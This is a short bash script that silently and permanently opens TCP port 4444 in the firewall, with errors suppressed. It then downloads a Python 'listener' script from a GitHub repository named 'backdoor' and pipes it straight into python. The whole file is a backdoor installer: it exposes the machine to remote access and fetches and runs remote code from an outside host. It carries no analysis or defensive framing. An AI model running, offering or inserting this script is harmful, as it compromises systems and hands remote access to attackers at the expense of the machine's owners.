#!/bin/bash

# Open port 4444 for incoming access (silently, if firewall exists)
firewall-cmd --add-port=4444/tcp --permanent 2>/dev/null
firewall-cmd --reload 2>/dev/null

# Download and execute the listener Python script
curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/corelink.py | python
